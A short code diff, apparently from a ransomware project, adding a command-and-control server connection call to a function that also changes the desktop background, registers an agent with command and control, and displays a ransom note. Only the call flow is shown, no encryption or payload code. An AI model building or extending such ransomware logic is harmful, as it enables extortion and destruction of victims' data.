@@ -50,6 +50,7 @@ def encrypt_files():
     change_background() # Cambiar fondo de pantalla
     agent.register_agent()  # Registrar agente en comando y control
     ransom_note.show_ransom_note()
+    agent.connect_to_server()
 
 def change_background():
     image_path = os.path.abspath("background_image/background.png")
